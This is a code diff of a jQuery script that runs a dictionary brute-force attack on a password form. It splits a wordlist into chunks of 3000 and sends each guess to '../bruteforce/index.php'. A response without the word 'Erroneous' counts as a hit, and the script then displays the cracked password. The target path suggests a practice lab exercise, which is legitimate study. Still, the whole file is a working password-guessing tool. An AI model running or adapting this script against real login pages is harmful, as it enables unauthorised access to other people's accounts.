@@ -1,7 +1,5 @@
 var passwords = [];
-var password = '';
-var numberOfAttackFailed = 0;
-var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter, result = [];
+var tested = 0;
 
   // $.get('./dico.txt', function(data){passwords = data.split(/\n/);});
 
@@ -15,50 +13,54 @@ var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter, result = 
     },
   });
 
-quarter = Math.floor(passwords.length / 4);
-firstQuarter = passwords.splice(0, quarter);
-secondQuarter = passwords.splice(0, quarter);
-thirdQuarter = passwords.splice(0, quarter);
-fourthQuarter = passwords.splice(0, quarter);
+  var finalArray = [];
+  var tempArray = [];
+  while (passwords.length){
+    tempArray = passwords.splice(0, 3000);
+    finalArray.push(tempArray);
+  }
 
-function ajaxAttack(array){
-  array.forEach(function(value){
+function testEachPasswords(array){
 
+  $.each( array, function(key, value){
 
-    var data = {password: value};
-    console.log('attacking!');
     $.ajax({
       type: 'GET',
       url: '../bruteforce/index.php',
-      data: data,
-      success: function(data){
-        if (data.length != 222){
+      data: 'password='+ value,
+      success: function (data){
+        if (data.indexOf('Erroneous') == -1){
+          $('#response').html(value);
           console.log(value);
-          result.push(data);
+        } else {
+          console.log('try again!');
+          tested++;
+          $('#tested').html(tested);
         }
-      },
-      error: function(){
-        console.log('FAILED');
-        numberOfAttackFailed++;
       }
     });
 
   });
 
+
 }
 
-$('#first-quarter').on('click', function(){
-  ajaxAttack(firstQuarter);
+$('#button1').on('click', function(){
+  testEachPasswords(finalArray[0]);
 });
 
-$('#second-quarter').on('click', function(){
-  ajaxAttack(secondQuarter);
+$('#button2').on('click', function(){
+  testEachPasswords(finalArray[1]);
 });
 
-$('#third-quarter').on('click', function(){
-  ajaxAttack(thirdQuarter);
+$('#button3').on('click', function(){
+  testEachPasswords(finalArray[2]);
 });
 
-$('#fourth-quarter').on('click', function(){
-  ajaxAttack(fourthQuarter);
+$('#button4').on('click', function(){
+  testEachPasswords(finalArray[3]);
+});
+
+$('#button5').on('click', function(){
+  testEachPasswords(finalArray[4]);
 });
